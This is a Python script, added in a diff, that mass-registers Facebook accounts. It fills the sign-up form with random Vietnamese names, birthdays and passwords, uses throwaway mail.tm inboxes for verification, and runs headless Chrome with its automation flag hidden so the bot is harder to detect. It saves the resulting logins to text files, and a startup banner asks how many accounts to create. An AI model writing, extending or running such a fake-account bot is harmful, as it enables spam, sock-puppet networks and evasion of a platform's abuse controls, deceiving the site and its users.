@@ -1,0 +1,598 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import os
+import re
+import time
+import random
+import json
+import requests
+import datetime
+import traceback
+from functools import wraps
+from bs4 import BeautifulSoup
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.support.ui import Select, WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from rich.progress import Progress
+from pystyle import Colors, Colorate
+from logging import getLogger, Formatter, StreamHandler, FileHandler, DEBUG, INFO
+import subprocess
+import os
+
+# Giảm log TensorFlow/TF-Lite nếu có (im lặng mức cao nhất)
+os.environ.setdefault("TF_CPP_MIN_LOG_LEVEL", "3")
+# Giảm log của webdriver-manager
+os.environ.setdefault("WDM_LOG_LEVEL", "0")   # hoặc "ERROR"
+
+# ---------------- CONFIG ----------------
+import platform
+
+IS_WINDOWS = platform.system().lower().startswith("win")
+
+if IS_WINDOWS:
+    # Chỉnh theo máy của bạn:
+    CHROME_BIN = r"C:\Program Files\Google\Chrome\Application\chrome.exe"   # chỉnh nếu chrome ở chỗ khác
+    CHROMEDRIVER_BIN = r""  # nếu để trống sẽ dùng webdriver-manager để tải driver
+    OUTPUT_FILE = r"C:\Users\Pc\Desktop\Phuocancoder_Regvery.txt"
+    LOG_FILE = r"C:\Users\Pc\Desktop\phuocancoder_debug.log"
+else:
+    # giữ mặc định (Termux/Android)
+    CHROME_BIN = "/data/data/com.termux/files/usr/bin/chromium-browser"
+    CHROMEDRIVER_BIN = "/data/data/com.termux/files/usr/bin/chromedriver"
+    OUTPUT_FILE = "/sdcard/Phuocancoder_Regvery.txt"
+    LOG_FILE = "/sdcard/phuocancoder_debug.log"
+
+# Debug / logging
+# 0 = tắt hoàn toàn debug/prints từ debug()
+# 1..5 = bật (càng lớn càng verbose)
+DEBUG_LEVEL = 0
+AUTO_VIEW = False
+
+# ---------------- LOGGER SETUP (QUIET MODE) ----------------
+from logging import getLogger, Formatter, StreamHandler, FileHandler, DEBUG, ERROR
+
+logger = getLogger("reg_bot")
+# đặt level cao để chặn INFO/WARNING
+logger.setLevel(ERROR)
+
+# console handler (chỉ lỗi)
+ch = StreamHandler()
+ch.setLevel(ERROR)
+ch.setFormatter(Formatter("%(asctime)s %(levelname)s: %(message)s", "%H:%M:%S"))
+logger.handlers = []
+logger.addHandler(ch)
+
+# file handler (nếu vẫn muốn lưu lỗi nặng vào file)
+try:
+    fh = FileHandler(LOG_FILE, encoding="utf-8")
+    fh.setLevel(ERROR)
+    fh.setFormatter(Formatter("%(asctime)s %(levelname)s %(module)s:%(lineno)d: %(message)s", "%Y-%m-%d %H:%M:%S"))
+    logger.addHandler(fh)
+except Exception as e:
+    # không in nhiều — in thẳng nếu không thể tạo file log
+    print(f"Không thể tạo file log {LOG_FILE}: {e}")
+
+def debug(msg, level=1):
+    """Print and file-log according to numeric level. When DEBUG_LEVEL == 0 this becomes mostly silent."""
+    if DEBUG_LEVEL == 0:
+        # hoàn toàn im lặng (nhưng vẫn giữ logic ghi logger cho level >=5)
+        if level >= 5:
+            try:
+                logger.error(msg)
+            except Exception:
+                pass
+        return
+
+    # nếu DEBUG_LEVEL > 0 thì hành vi cũ (giữ nguyên)
+    if level <= DEBUG_LEVEL:
+        prefix = {
+            1: "ℹ️",
+            2: "⚙️",
+            3: "🌀",
+            4: "📡",
+            5: "🔥"
+        }.get(level, "ℹ️")
+        line = Colorate.Horizontal(Colors.cyan_to_blue, f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {prefix} {msg}")
+        print(line)
+    # Always write to logger for full trace (respects handler levels set earlier)
+    if level >= 5:
+        logger.error(msg)
+    elif level == 4:
+        logger.warning(msg)
+    elif level == 3:
+        logger.info(msg)
+    else:
+        logger.debug(msg)
+
+
+def short(text, length=400):
+    if not text:
+        return ""
+    s = str(text)
+    if len(s) <= length:
+        return s
+    return s[:length] + "...[truncated:{}]".format(len(s))
+
+def safe_mkdir(path):
+    try:
+        os.makedirs(path, exist_ok=True)
+    except Exception as e:
+        debug(f"Không tạo được thư mục {path}: {e}", 5)
+
+def timestamp():
+    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+
+# ---------------- DECORATORS ----------------
+def log_call(level=3):
+    """Decorator: log function entry/exit + duration + exceptions."""
+    def deco(func):
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            name = func.__name__
+            debug(f"→ ENTER {name} args={short(args)} kwargs={short(kwargs)}", level)
+            start = time.time()
+            try:
+                result = func(*args, **kwargs)
+                dur = time.time() - start
+                debug(f"← EXIT {name} (took {dur:.2f}s) return={short(result)}", level)
+                return result
+            except Exception as e:
+                dur = time.time() - start
+                tb = traceback.format_exc()
+                debug(f"!! EXCEPTION in {name} after {dur:.2f}s: {e}\n{tb}", 5)
+                raise
+        return wrapper
+    return deco
+
+# ---------------- RANDOM DATA ----------------
+def random_vn_name():
+    first = ["Nguyễn","Trần","Lê","Phạm","Hoàng","Huỳnh","Phan","Vũ","Đặng","Bùi"]
+    mid = ["Văn","Thị","Đức","Thành","Minh","Quốc","Công","Hữu","Trọng","Tấn"]
+    last = ["An","Bình","Cường","Dũng","Hùng","Kiệt","Long","Nam","Linh","Quý"]
+    return f"{random.choice(first)} {random.choice(mid)} {random.choice(last)}"
+
+def random_birthday():
+    start, end = datetime.date(1985,1,1), datetime.date(2003,12,31)
+    d = start + datetime.timedelta(days=random.randint(0, (end - start).days))
+    return d.strftime("%d/%m/%Y")
+
+def random_password(length=10):
+    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#"
+    return ''.join(random.choice(chars) for _ in range(length))
+
+# ---------------- HTTP (mail.tm) ----------------
+@log_call(level=4)
+def create_mailtm_account():
+    """Tạo email tạm + token từ mail.tm, có retry, random pass, log chi tiết."""
+    try:
+        # --- DOMAIN RANDOM ---
+        r = requests.get("https://api.mail.tm/domains", timeout=10)
+        data = r.json()
+        domains = [d["domain"] for d in data["hydra:member"]]
+        domain = random.choice(domains)
+        
+
+        # --- RANDOM EMAIL + PASSWORD ---
+        username = f"nqdregnvr{random.randint(100000, 999999)}"
+        address = f"{username}@{domain}".lower()
+        password = f"Passw0rd{random.randint(1000,9999)}@@@!"
+
+        debug(f"Tạo tài khoản mail.tm: {address} | pass={password}", 3)
+
+        # --- SESSION & HEADER ---
+        session = requests.Session()
+        session.headers.update({
+            "User-Agent": "Mozilla/5.0 (RegBot/1.0)",
+            "Accept": "application/json",
+            "Origin": "http://temp-mail.site",
+            "Referer": "http://temp-mail.site/",
+        })
+
+        # --- GỬI REQUEST TẠO ACCOUNT ---
+        url_create = "https://api.mail.tm/accounts"
+        payload = {"address": address, "password": password}
+        debug(f"[mail.tm] POST {url_create} payload={payload}", 4)
+
+        r = session.post(url_create, json=payload, timeout=30)
+        debug(f"[mail.tm] create status={r.status_code} body={short(r.text, 500)}", 4)
+
+        # --- XỬ LÝ RESPONSE ---
+        if r.status_code not in (200, 201):
+            raise RuntimeError(f"Tạo account thất bại: {r.status_code} {r.text[:200]}")
+
+        # --- LẤY TOKEN (RETRY 5 LẦN VÌ API CHẬM) ---
+        token = None
+        url_token = "https://api.mail.tm/token"
+        payload_token = {"address": address, "password": password}
+
+        for attempt in range(1, 6):
+            try:
+                r = session.post(url_token, json=payload_token, timeout=20)
+                debug(f"[mail.tm] token attempt {attempt}/5 status={r.status_code} body={r.text[:200]}", 4)
+
+                if r.status_code == 200:
+                    data = r.json()
+                    token = data.get("token")
+                    if token:
+                        break
+            except Exception as e:
+                debug(f"[mail.tm] token attempt {attempt} error: {e}", 5)
+            time.sleep(2 + attempt)
+
+        if not token:
+            raise RuntimeError("Không lấy được token mail.tm (sau 5 lần thử)")
+
+        # --- CẬP NHẬT HEADER AUTH ---
+        session.headers.update({"Authorization": f"Bearer {token}"})
+        debug(f"✅ Đăng nhập mail.tm thành công: {address}", 3)
+
+        return address, password, session,token
+
+    except Exception as e:
+        debug(f"[create_mailtm_account] Lỗi: {e}\n{traceback.format_exc()}", 5)
+        raise
+
+
+@log_call(level=4)
+def poll_mailtm(session, tk=None, mk=None, timeout=60):
+    """
+    Kiểm tra hộp thư mail.tm để lấy mã xác minh hoặc link kích hoạt Facebook.
+    Tự động retry nhiều lần, tránh lỗi JSON bất thường.
+    """
+    try:
+        headers = {"address": tk, "password": mk}
+        inbox_url = "https://api.mail.tm/messages"
+        start_time = time.time()
+        debug(f"Bắt đầu poll mail.tm trong {timeout}s...", 3)
+
+        while time.time() - start_time < timeout:
+            r = session.get(inbox_url, headers=headers, timeout=20)
+            raw = short(r.text, 500)
+            debug(f"[mail.tm] GET /messages status={r.status_code} body={raw}", 4)
+
+            # --- Tránh lỗi list object ---
+            try:
+                data = r.json()
+            except Exception as e:
+                debug(f"[poll_mailtm] JSON decode error: {e}", 5)
+                data = {}
+
+            # Một số domain trả về list [] chứ không phải dict
+            if isinstance(data, list):
+                messages = data
+            else:
+                messages = data.get("hydra:member", [])
+
+            if messages:
+                msg = messages[0]
+                msg_id = msg.get("id")
+                debug(f"[mail.tm] 📧 Có thư mới id={msg_id}", 3)
+
+                # --- Lấy chi tiết mail ---
+                r2 = session.get(f"{inbox_url}/{msg_id}", timeout=20)
+                msg_data = r2.json()
+                subject = msg_data.get("subject", "")
+                intro = msg_data.get("intro", "")
+                html = msg_data.get("html", [""])[0] if msg_data.get("html") else ""
+
+                debug(f"[mail.tm] subject={subject} | intro={intro[:100]}", 4)
+
+                return {
+                    "id": msg_id,
+                    "subject": subject,
+                    "intro": intro,
+                    "html": html
+                }
+
+            # Nếu chưa có thư
+            time.sleep(3)
+
+        raise TimeoutError("Không nhận được thư trong thời gian chờ")
+
+    except Exception as e:
+        debug(f"[poll_mailtm] Exception: {e}\n{traceback.format_exc()}", 5)
+        return None
+
+
+@log_call(level=3)
+def create_driver():
+    opts = Options()
+
+    # Nếu bạn có CHROME_BIN hợp lệ, để nguyên; không có thì Chrome mặc định sẽ dùng.
+    try:
+        if CHROME_BIN and os.path.exists(CHROME_BIN):
+            opts.binary_location = CHROME_BIN
+    except Exception:
+        pass
+
+    # Headless
+    try:
+        opts.add_argument("--headless=new")
+    except Exception:
+        opts.add_argument("--headless")
+
+    # Ẩn/giảm log của Chrome
+    opts.add_argument("--no-sandbox")
+    opts.add_argument("--disable-dev-shm-usage")
+    opts.add_argument("--window-size=1280,800")
+    opts.add_argument("--disable-blink-features=AutomationControlled")
+
+    # ↓↓↓ 3 cách “đè” log của Chrome/Chromedriver ↓↓↓
+    # 1) giảm mức log của Chrome
+    opts.add_argument("--log-level=3")        # 0=ALL, 1=ERROR, 2=WARNING, 3=INFO; nhưng thực tế 3 ~ im hơn
+    opts.add_argument("--silent")             # một số bản tôn trọng cờ này
+    opts.add_argument("--disable-logging")
+    opts.add_argument("--v=0")
+
+    # 2) chặn switch "enable-logging" (Windows thường gây ra 'DevTools listening ...')
+    try:
+        opts.add_experimental_option("excludeSwitches", ["enable-logging"])
+    except Exception:
+        pass
+
+    # 3) đặt loggingPrefs thấp (không bắt buộc)
+    try:
+        opts.set_capability("goog:loggingPrefs", {"browser": "SEVERE"})
+    except Exception:
+        pass
+
+    # Tạo Service “câm” (bịt stdout/stderr của chromedriver)
+    serv = None
+    try:
+        if CHROMEDRIVER_BIN and os.path.exists(CHROMEDRIVER_BIN):
+            serv = Service(executable_path=CHROMEDRIVER_BIN, log_output=subprocess.DEVNULL)
+        else:
+            from webdriver_manager.chrome import ChromeDriverManager
+            serv = Service(ChromeDriverManager().install(), log_output=subprocess.DEVNULL)
+    except Exception:
+        # Fallback nếu Selenium cũ chưa có tham số log_output
+        if CHROMEDRIVER_BIN and os.path.exists(CHROMEDRIVER_BIN):
+            serv = Service(CHROMEDRIVER_BIN)
+        else:
+            from webdriver_manager.chrome import ChromeDriverManager
+            serv = Service(ChromeDriverManager().install())
+
+    # Ẩn cửa sổ console của chromedriver trên Windows
+    try:
+        serv.creationflags = subprocess.CREATE_NO_WINDOW
+    except Exception:
+        pass
+
+    # Khởi tạo driver
+    driver = webdriver.Chrome(service=serv, options=opts)
+    return driver
+
+
+
+def save_error_artifacts(driver, index, prefix="error"):
+    """Lưu screenshot + page source + current url khi gặp lỗi."""
+    try:
+        ss_dir = "/sdcard/Reg_Screenshots"
+        safe_mkdir(ss_dir)
+        ts = timestamp()
+        png = os.path.join(ss_dir, f"{prefix}_{index}_{ts}.png")
+        html = os.path.join(ss_dir, f"{prefix}_{index}_{ts}.html")
+        try:
+            driver.save_screenshot(png)
+            debug(f"📸 Lưu screenshot tại {png}", 3)
+        except Exception as e:
+            debug(f"Không chụp được screenshot: {e}", 5)
+        try:
+            with open(html, "w", encoding="utf-8") as fh:
+                fh.write(driver.page_source or "")
+            debug(f"📝 Lưu page_source tại {html}", 3)
+        except Exception as e:
+            debug(f"Không lưu được page source: {e}", 5)
+        try:
+            url = driver.current_url
+            debug(f"🧭 Current URL khi lỗi: {url}", 3)
+        except Exception as e:
+            debug(f"Không lấy được current_url: {e}", 4)
+        # browser logs if available
+        try:
+            logs = driver.get_log("browser")
+            if logs:
+                log_file = os.path.join(ss_dir, f"{prefix}_{index}_{ts}_browserlog.json")
+                with open(log_file, "w", encoding="utf-8") as fh:
+                    json.dump(logs, fh, ensure_ascii=False, indent=2)
+                debug(f"🗒️ Lưu browser logs tại {log_file}", 3)
+        except Exception:
+            # not fatal
+            pass
+    except Exception as e:
+        debug(f"[save_error_artifacts] Lỗi: {e}", 5)
+
+# ---------------- REGISTER FLOW ----------------
+@log_call(level=3)
+def register_and_verify(index):
+    fullname = random_vn_name()
+    # split first/last more robustly
+    parts = fullname.split()
+    first = parts[0]
+    last = " ".join(parts[1:]) if len(parts) > 1 else "Nguyen"
+    day, month, year = random_birthday().split("/")
+    email, mail_pass, mail_sess ,token = create_mailtm_account()
+    passwd = random_password(12)
+    res = {"index": index, "name": fullname, "email": email, "password": passwd, "verified": False}
+
+    print(Colorate.Horizontal(Colors.yellow_to_red, f"\n[{index}] Đăng ký: {fullname} ({email}|{passwd})"))
+    try:
+        acc_txt_path = os.path.join(os.path.dirname(__file__) or os.getcwd(), "acc.txt")
+        with open(acc_txt_path, "a", encoding="utf-8", newline="\n") as f:
+            f.write(f"{email} | {passwd}\n")
+    except Exception as e:
+        debug(f"Không ghi được acc.txt (pending): {e}", 5)
+
+    driver = None
+    try:
+        driver = create_driver()
+        debug("Mở trang đăng ký Facebook", 2)
+        driver.get("https://www.facebook.com/reg")
+        WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.NAME, "firstname"))).send_keys(first)
+        driver.find_element(By.NAME, "lastname").send_keys(last)
+        driver.find_element(By.NAME, "reg_email__").send_keys(email)
+        time.sleep(2)
+        try:
+            # some flows show confirmation field
+            driver.find_element(By.NAME, "reg_email_confirmation__").send_keys(email)
+        except Exception:
+            debug("Không tìm thấy field reg_email_confirmation__ (bỏ qua)", 4)
+        driver.find_element(By.NAME, "reg_passwd__").send_keys(passwd)
+        Select(driver.find_element(By.NAME, "birthday_day")).select_by_value(str(int(day)))
+        Select(driver.find_element(By.NAME, "birthday_month")).select_by_value(str(int(month)))
+        Select(driver.find_element(By.NAME, "birthday_year")).select_by_value(year)
+        # gender might be radio or select; trying radio input with value=2 (female) like original
+        try:
+            driver.find_element(By.XPATH, "//input[@value='2']").click()
+        except Exception:
+            debug("Không click được radio gender value=2, thử bỏ qua", 4)
+        # submit
+        try:
+            driver.find_element(By.NAME, "websubmit").click()
+        except Exception:
+            debug("Không tìm thấy button websubmit, thử submit form bằng JS", 4)
+            try:
+                driver.execute_script("document.forms[0].submit();")
+            except Exception as e:
+                debug(f"Không submit được form: {e}", 5)
+
+        debug("Đã gửi form đăng ký Facebook", 2)
+        time.sleep(5)
+
+        ss_dir = "/sdcard/Reg_Screenshots"
+        safe_mkdir(ss_dir)
+        path = os.path.join(ss_dir, f"reg_{index}_{timestamp()}.png")
+        try:
+            driver.save_screenshot(path)
+            debug(f"📸 Lưu ảnh tại {path}", 3)
+        except Exception as e:
+            debug(f"Lỗi lưu screenshot: {e}", 5)
+
+        if AUTO_VIEW:
+            try:
+                os.system(f"termux-open {path}")
+            except Exception:
+                debug("AUTO_VIEW bật nhưng termux-open không hoạt động", 4)
+
+        # Poll mail
+        found = poll_mailtm(mail_sess, email, mail_pass)
+        path2 = os.path.join(ss_dir, f"reg_{index}_afterpoll_{timestamp()}.png")
+        try:
+            driver.save_screenshot(path2)
+            debug(f"📸 Lưu ảnh sau poll tại {path2}", 3)
+        except Exception:
+            pass
+        if found:
+            # mark verified
+            res["verified"] = True
+
+            # lấy thông tin verify một cách an toàn từ mail (dùng html hoặc intro/subject)
+            verify_text = found.get("intro") or found.get("subject") or found.get("html") or str(found)
+
+            # lưu verify info vào res
+            res["verify_info"] = verify_text
+
+            # in ra thông báo thành công
+            print(Colorate.Horizontal(Colors.green_to_white, f"[{index}] ✅ Nhận xác minh: {verify_text}"))
+            try:
+                acc_txt_path = os.path.join(os.path.dirname(__file__) or os.getcwd(), "acc.txt")
+                with open(acc_txt_path, "a", encoding="utf-8", newline="\n") as accf:
+                    accf.write(f"{email} | {passwd}\n")
+                debug(f"✅ Ghi acc.txt: {acc_txt_path}", 3)
+            except Exception as e:
+                debug(f"❌ Không ghi được acc.txt: {e}", 5)
+
+            # --- Ghi file riêng khi đăng ký thành công ---
+            try:
+                success_dir = os.path.join(os.path.dirname(OUTPUT_FILE) or ".", "Reg_Success")
+                os.makedirs(success_dir, exist_ok=True)
+                # mỗi acc ra 1 file riêng
+                success_path = os.path.join(success_dir, f"success_{timestamp()}.txt")
+                with open(success_path, "w", encoding="utf-8") as sf:
+                    sf.write("=== ACCOUNT REGISTERED SUCCESSFULLY ===\n")
+                    sf.write(f"Name      : {fullname}\n")
+                    sf.write(f"Email     : {email}\n")
+                    sf.write(f"Password  : {passwd}\n")
+                    sf.write(f"Verified  : {res['verified']}\n")
+                    sf.write(f"Verification info: {verify_text}\n")
+                    sf.write(f"Created at: {datetime.datetime.now()}\n")
+                # optional: also append to the single master file
+                try:
+                    with open(OUTPUT_FILE, "a", encoding="utf-8") as mf:
+                        mf.write(f"{fullname} | {email} | {passwd} | verified:{res['verified']} | info:{verify_text}\n")
+                except Exception as e:
+                    debug(f"Không ghi được vào OUTPUT_FILE: {e}", 5)
+                debug(f"✅ Lưu file thông tin tài khoản thành công tại {success_path}", 3)
+            except Exception as e:
+                debug(f"❌ Không ghi được file thành công: {e}", 5)
+        else:
+            print(Colorate.Horizontal(Colors.red_to_yellow, f"[{index}] ❌ Không thấy mail xác minh."))
+
+    except Exception as e:
+        debug(f"Lỗi chính trong register_and_verify: {e}\n{traceback.format_exc()}", 5)
+        if driver:
+            save_error_artifacts(driver, index, prefix="register_error")
+    finally:
+        try:
+            if driver:
+                driver.quit()
+        except Exception as e:
+            debug(f"Lỗi khi quit driver: {e}", 4)
+
+    # Write result to output
+    try:
+        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
+            f.write(f"{fullname} | {email} | {passwd} | verified:{res['verified']}\n")
+        debug(f"Ghi kết quả vào {OUTPUT_FILE}", 3)
+    except Exception as e:
+        debug(f"Không ghi được file output: {e}", 5)
+
+    return res
+
+# ---------------- MAIN ----------------
+def main():
+    os.system("clear")
+    print(Colorate.Horizontal(Colors.rainbow, """
+╭━━━┳━━━┳━━━┳━━━┳━━━━╮
+┃╭━╮┃╭━╮┃╭━╮┣╮╭╮┣━━╮━┃
+┃╰━╯┃┃╱┃┃╰━╯┃┃┃┃┃╱╭╯╭╯
+┃╭━━┫╰━╯┃╭━━╯┃┃┃┃━╯╭╯
+┃┃╱╱┃╭━╮┃┃╱╱╭╯╰╯┣━━╯━
+╰╯╱╱╰╯╱╰┻╯╱╱╰━━━┻━━━━╯
+"""))
+    try:
+        n = int(input(Colorate.Horizontal(Colors.yellow_to_red, "Số lượng acc cần tạo: ")))
+    except Exception:
+        debug("Nhập không hợp lệ cho số lượng, dùng mặc định 1", 3)
+        n = 1
+    try:
+        delay = float(input(Colorate.Horizontal(Colors.yellow_to_red, "Delay giữa mỗi acc (giây): ")))
+    except Exception:
+        debug("Delay nhập không hợp lệ, dùng 5s", 3)
+        delay = 5.0
+    view = input(Colorate.Horizontal(Colors.yellow_to_red, "Tự mở ảnh sau khi chụp? (y/n): ")).strip().lower()
+    if view == "y":
+        global AUTO_VIEW
+        AUTO_VIEW = True
+
+    verified, failed = 0, 0
+    for i in range(1, n+1):
+        try:
+            r = register_and_verify(i)
+            verified += int(bool(r.get("verified")))
+            failed += int(not bool(r.get("verified")))
+        except Exception as e:
+            # nếu bạn vẫn muốn ghi error nặng, debug(level=5) sẽ gửi logger.error
+            debug(f"Lỗi ở vòng tạo acc {i}: {e}", 5)
+            failed += 1
+        # không in progress, chỉ chờ delay
+        time.sleep(delay)
+    print(Colorate.Horizontal(Colors.rainbow, f"\n🎉 Xong! {verified}/{n} xác minh thành công. Lưu tại {OUTPUT_FILE}"))
+    debug(f"Summary: total={n} verified={verified} failed={failed}", 2)
+
+if __name__ == "__main__":
+    main()
